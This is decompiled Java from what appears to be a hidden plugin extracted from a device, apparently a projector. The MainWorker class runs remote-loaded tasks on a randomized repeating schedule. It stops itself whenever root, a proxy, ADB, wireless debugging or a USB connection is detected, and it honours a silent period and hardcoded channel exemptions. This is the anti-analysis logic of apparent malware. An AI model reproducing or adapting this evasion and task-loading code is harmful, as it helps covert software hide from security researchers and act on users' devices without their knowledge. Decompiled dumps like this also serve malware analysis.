package com.hs.cld;

import android.content.Context;
import com.hs.cld.basic.TaskManager;
import com.hs.cld.da.dx.DexManager;
import com.hs.p.basic.AMetas;
import com.hs.p.basic.Logger;
import com.hs.p.basic.Media;
import com.hs.p.basic.Porting;
import com.hs.p.basic.Release;
import com.hs.p.basic.SLT;
import com.hs.p.basic.Settings;
import com.hs.p.common.PROP;
import com.hs.p.common.async.AsyncHandler;
import com.hs.p.common.async.Implementable;
import com.hs.p.common.utils.LOG;
import com.hs.p.common.utils.SystemUtils;
import com.hs.p.common.utils.TextUtils;
import java.util.Random;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class MainWorker {
    private static final String TAG = "P.MainWorker";
    private AsyncHandler mAsyncHandler;
    private boolean mStarted;

    private static class Holder {
        private static final MainWorker INSTANCE = new MainWorker();

        private Holder() {
        }
    }

    private MainWorker() {
        this.mAsyncHandler = AsyncHandler.create("main");
        this.mStarted = false;
    }

    public static MainWorker get() {
        return Holder.INSTANCE;
    }

    private static String getPackageName(Context context) {
        try {
            return context.getPackageName();
        } catch (Throwable unused) {
            return "";
        }
    }

    private boolean isUserDebugSecurityMode(Context context) {
        String str;
        if (Porting.isProxyEnabled()) {
            str = "proxy enabled ...";
        } else {
            if (!Porting.isWifiAdbEnabled(context)) {
                return true;
            }
            str = "wifi adb enabled ...";
        }
        Logger.append(context, TAG, str);
        return false;
    }

    private boolean isUserSecurityMode(Context context) {
        String str;
        if (Porting.isDeviceRoot()) {
            str = "device root ...";
        } else if (Porting.isProxyEnabled()) {
            str = "proxy enabled ...";
        } else if (Porting.isAdbEnabled(context)) {
            str = "adb enabled ...";
        } else {
            if (!Porting.isWifiAdbEnabled(context)) {
                return true;
            }
            str = "wifi adb enabled ...";
        }
        Logger.append(context, TAG, str);
        return false;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean jobWork(Context context) {
        try {
            return jobWorkThrowable(context);
        } catch (Throwable th) {
            LOG.d(TAG, "do job work failed: " + th);
            return true;
        }
    }

    private void jobWorkExit(Context context) {
        DexManager.get().destroy(context);
    }

    /* JADX WARN: Code duplicated, block: B:40:0x00a2  */
    private boolean jobWorkThrowable(Context context) {
        LOG.setEnabled(PROP.isLogEnabled());
        boolean zShouldIgnoreSecurityChecks = shouldIgnoreSecurityChecks(context);
        if (zShouldIgnoreSecurityChecks && Settings.isCheckDevMode(context, false)) {
            LOG.i(TAG, "ignore check security mode for shizhuang_xu, clear ...");
            Settings.putCheckDevMode(context, false);
        }
        if (SLT.isSilent(context)) {
            Logger.append(context, TAG, "app slt to " + SLT.ymd(SLT.millis(context)));
            jobWorkExit(context);
            return true;
        }
        if (Porting.isDevUserType()) {
            if (!PROP.ignoreCheckMode()) {
                if (!Settings.isCheckDevMode(context, false)) {
                    LOG.i(TAG, "ignore dev mode ...");
                } else if (!isUserSecurityMode(context)) {
                    jobWorkExit(context);
                    return false;
                }
            }
        } else {
            if (!zShouldIgnoreSecurityChecks && !Settings.shouldSkipSafeModeCheck() && TextUtils.compare(AMetas.VALUE_DEFAULT_CHANNEL, "T12231") != 0 && TextUtils.compare(AMetas.VALUE_DEFAULT_CHANNEL, "T12251") != 0 && !PROP.isIgnoreCheckUsbConnected() && Porting.isUsbConnected(context)) {
                LOG.i(TAG, "usb connected ....");
                jobWorkExit(context);
                return false;
            }
            if (!Settings.isCheckDevMode(context, false)) {
                LOG.i(TAG, "ignore dev mode ...");
            } else if (!isUserDebugSecurityMode(context)) {
                jobWorkExit(context);
                return false;
            }
        }
        processTasks(context);
        return true;
    }

    private void processTasks(Context context) {
        try {
            LOG.i(TAG, "process tasks start ...");
            TaskManager.process(context, new TaskManager.OnTaskListener() { // from class: com.hs.cld.MainWorker.2
                @Override // com.hs.cld.basic.TaskManager.OnTaskListener
                public void onFinished() {
                    LOG.i(MainWorker.TAG, "process tasks done ...");
                }
            });
        } catch (Throwable th) {
            LOG.w(TAG, "process tasks failed: " + th);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public long randomDelays() {
        return (PROP.isBeta() ? 30L : 300L) + ((long) new Random().nextInt(30));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void scheduleNextJob(final Context context, long j) {
        LOG.d(TAG, "schedule next job: ctx=" + context + ", package=" + getPackageName(context) + ", v=" + Release.VERSION_NAME + ", delays=" + j);
        this.mAsyncHandler.postDelayed(new Implementable("mainJob") { // from class: com.hs.cld.MainWorker.1
            @Override // com.hs.p.common.async.Implementable
            public void implement() {
                if (MainWorker.this.jobWork(context)) {
                    MainWorker mainWorker = MainWorker.this;
                    mainWorker.scheduleNextJob(context, mainWorker.randomDelays());
                } else {
                    LOG.d(MainWorker.TAG, "schedule job exit ...");
                    MainWorker.this.mStarted = false;
                }
            }
        }, j * 1000);
    }

    private static boolean shouldIgnoreSecurityChecks(Context context) {
        try {
            return "shizhuang_xu".equals(Media.getChannel(context));
        } catch (Throwable unused) {
            return false;
        }
    }

    public synchronized void start(Context context) {
        if (!this.mStarted) {
            LOG.i(TAG, "start: ctx=" + context + ", package=" + getPackageName(context) + ", v=" + Release.VERSION_NAME + ", slt=" + SLT.isSilent(context) + ", dm=" + SystemUtils.isDevModeEnabled(context) + ", sm=" + SystemUtils.isSecurityMode(context));
            scheduleNextJob(context, 10L);
            this.mStarted = true;
        }
    }
}
